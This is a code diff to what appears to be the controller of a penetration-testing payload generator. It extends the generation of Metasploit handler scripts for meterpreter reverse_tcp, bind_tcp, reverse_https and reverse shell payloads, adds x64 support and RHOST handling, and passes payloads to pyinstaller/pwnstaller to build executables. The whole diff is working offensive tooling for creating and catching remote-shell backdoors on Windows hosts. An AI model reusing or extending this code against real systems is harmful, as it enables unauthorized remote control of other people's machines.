@@ -505,20 +505,28 @@ class Controller:
             keys = payload.required_options.keys()
 
             # assuming if LHOST is set, we need a handler script
-            if "LHOST" in keys:
+            if "LHOST" in keys or "RHOST" in keys:
 
                 handler = "use exploit/multi/handler\n"
                 # do our best to determine the payload type
 
+                architecture = ""
+                if hasattr(payload, "architecture") and payload.architecture == "64":
+                    architecture = "x64/"
+
+
                 # handle options from the backdoor factory
                 if "payload" in keys:
                     p = payload.required_options["payload"][0]
-                    if "tcp" in p:
-                        handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
+
+                    if "rev_tcp" in p:
+                        handler += "set PAYLOAD windows/%smeterpreter/reverse_tcp\n" % architecture
+                    elif "bind_tcp" in p:
+                        handler += "set PAYLOAD windows/%smeterpreter/bind_tcp\n" % architecture
                     elif "https" in p:
-                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
+                        handler += "set PAYLOAD windows/%smeterpreter/reverse_https\n" % architecture
                     elif "shell" in  p:
-                        handler += "set PAYLOAD windows/shell_reverse_tcp\n"
+                        handler += "set PAYLOAD windows/%sshell_reverse_tcp\n" % architecture
                     else: pass
 
                 # if not BDF, try to extract the handler type from the payload name
@@ -527,18 +535,24 @@ class Controller:
                     payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
 
                     # pure rev_tcp stager
-                    if "tcp" in payloadname.lower():
-                        handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
+                    if "rev_tcp" in payloadname.lower():
+                        handler += "set PAYLOAD windows/%smeterpreter/reverse_tcp\n" % architecture
+                    # pure bind_tcp stager
+                    elif "bind_tcp" in payloadname.lower():
+                        handler += "set PAYLOAD windows/%smeterpreter/bind_tcp\n" % architecture
                     # pure rev_https stager
                     elif "https" in payloadname.lower():
-                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
+                        handler += "set PAYLOAD windows/%smeterpreter/reverse_https\n" % architecture
                     # pure rev_http stager
                     elif "http" in payloadname.lower():
-                        handler += "set PAYLOAD windows/meterpreter/reverse_http\n"
+                        handler += "set PAYLOAD windows/%smeterpreter/reverse_http\n" % architecture
                     else: pass
 
                 # grab the LHOST value
-                handler += "set LHOST " + payload.required_options["LHOST"][0] + "\n"
+                if "LHOST" in keys:
+                    handler += "set LHOST " + payload.required_options["LHOST"][0] + "\n"
+                if "RHOST" in keys:
+                    handler += "set RHOST " + payload.required_options["RHOST"][0] + "\n"
 
                 # grab the LPORT value if it was set
                 if "LPORT" in keys:
@@ -579,14 +593,14 @@ class Controller:
 
                     # check if the --pwnstaller flag was passed
                     if args and args.pwnstaller:
-                        supportfiles.supportingFiles(self.payload.language, OutputFileName, {'method':'pwnstaller'})
+                        supportfiles.supportingFiles(self.payload, OutputFileName, {'method':'pwnstaller'})
                     else:
                         # if interactive, allow the user to choose the method
                         if interactive:
-                            supportfiles.supportingFiles(self.payload.language, OutputFileName, {})
+                            supportfiles.supportingFiles(self.payload, OutputFileName, {})
                         # otherwise specify the default, pyinstaller
                         else:
-                            supportfiles.supportingFiles(self.payload.language, OutputFileName, {'method':'pyinstaller'})
+                            supportfiles.supportingFiles(self.payload, OutputFileName, {'method':'pyinstaller'})
 
                     # if we're compiling, set the returned file name to the output .exe
                     # so we can return this for external calls to the framework
